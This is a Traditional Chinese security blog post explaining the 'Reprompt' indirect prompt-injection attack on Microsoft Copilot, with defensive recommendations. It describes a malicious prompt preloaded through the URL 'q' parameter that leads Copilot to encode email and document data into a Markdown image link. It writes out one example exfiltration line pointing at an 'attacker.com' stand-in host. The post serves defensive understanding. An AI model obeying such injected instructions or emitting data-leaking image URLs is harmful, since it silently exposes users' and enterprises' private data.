---
title: "【技術研究】從 Reprompt 漏洞看 AI 安全：當「聽話」成為 Copilot 最致命的弱點"
date: "2026年 01月 27日"
excerpt: "深入解析 Microsoft Copilot 的 Reprompt 攻擊原理。探討駭客如何利用 URL 參數進行間接提示詞注入（Indirect Prompt Injection），以及企業該如何防範數據隱形外洩。"
tags: ["AI Security", "Copilot", "Prompt Injection", "Cybersecurity", "Red Teaming"]
readTime: "5 min read"
slug: "reprompt-copilot-vulnerability"
---
### 前言
在 AI 的世界裡，**語言即代碼**。這是我最近在進行 GenAI 安全架構研究時的核心感悟。近期 Microsoft Copilot 爆出的 **「Reprompt」** 漏洞，本質上並非傳統的程式碼缺陷，而是一場教科書級別的「間接提示詞注入」（Indirect Prompt Injection）。透過分析此案例的底層路徑，我發現了生成式 AI 應用在權限隔離與指令解析上的幾個根本性盲點。

---

### 一、技術核心：環境污染與隱形的數據外洩路徑

Reprompt 攻擊的精妙（且危險）之處，在於它將 AI 的「推理能力」轉化為「攻擊武器」。



以下是我針對此漏洞攻擊鏈（Kill Chain）的拆解：

#### 1. 注入向量：被忽視的 URL 預加載權限
研究發現，Copilot 的 URL 參數（特別是 `q` 參數）是一個極度脆弱的攻擊面。攻擊者能預先將惡意 Payload 植入 LLM 的上下文窗口（Context Window）。當使用者點擊連結時，這不是在啟動對話，而是在進行**「環境污染」**——在用戶產生自發輸入前，AI 的行為邏輯就已經被劫持。

#### 2. 數據外洩的「任意門」：Markdown 圖片渲染
這是整條攻擊鏈中最具實際威脅的一環。
雖然 LLM 本身無法主動發起 HTTP 請求，但它被允許生成並渲染 Markdown 內容，而瀏覽器則會「代為執行」這些請求。

攻擊流程如下：
* **指令偽裝：** 攻擊 Payload 會誘導 AI 將敏感企業資料（如電子郵件內容、內部文件、聯絡人資訊）編碼後拼接進圖片 URL
* **靜默外洩：** 當瀏覽器嘗試渲染 `![data](https://attacker.com/log?leak=...)` 時，資料即隨請求被送往攻擊者伺服器
這種方式可完全繞過傳統 DLP（Data Loss Prevention）系統，因為在網路層觀測中，該流量僅表現為一次「普通圖片請求」，而非資料外傳行為。

#### 3. 權限提升：M365 Graph 的連鎖反應
若使用者開啟了 Microsoft 365 Graph 權限，Copilot 可合法讀取電子郵件、OneDrive 文件、行事曆與通訊錄等核心企業資料。
一旦 Session 遭 Reprompt 劫持，風險並不在於 Graph API 被入侵，而是合法讀取的資料，被誘導轉譯並透過非預期通道外洩。


### 二、架構性風險：為什麼傳統防護無能為力？

透過 Ars Technica 與 BleepingComputer 等技術分析可以看出，傳統的 Web 安全防護（如 WAF）對此類攻擊幾乎失效。這揭露了 AI 安全的三大架構性問題：

* **信任邊界模糊：** 系統預設信任來自 URL 參數的輸入，未對其指令優先級進行有效隔離。
* **指令與數據的混淆：** LLM 目前難以區分「系統級指令」與「外部傳入數據」，這給了攻擊者奪取控制權的空間。
* **自動渲染權限的濫用：** 客戶端對 AI 生成內容（如圖片、連結）的自動解析，成為了數據外洩的最後一哩路。



### 三、防護建議與研究結論

雖然微軟已針對此漏洞發布補丁，但「提示詞注入」的風險依然存在。對於開發者與資深使用者，我有以下建議：

1.  **實施嚴格的 CSP (Content Security Policy)：** 限制 AI 僅能載入受信任網域的資源，從前端切斷 Markdown 渲染外洩的路徑。
2.  **強制 Session 隔離：** 處理高敏感任務前，必須清空對話（New Topic），以清除潛在的污染指令。
3.  **檢視 URL 參數信任等級：** 禁止透過網址參數直接引導 AI 執行涉及跨權限的操作。


### 參考來源 (Reference List)
* **[Ars Technica]** [A single click mounted a covert, multistage attack against Copilot](https://arstechnica.com/security/2026/01/a-single-click-mounted-a-covert-multistage-attack-against-copilot/)
* **[SecurityWeek]** [New 'Reprompt' Attack Silently Siphons Microsoft Copilot Data](https://www.securityweek.com/new-reprompt-attack-silently-siphons-microsoft-copilot-data/)
* **[Varonis]** [Reprompt: How a single click can compromise your AI data](https://www.varonis.com/blog/reprompt)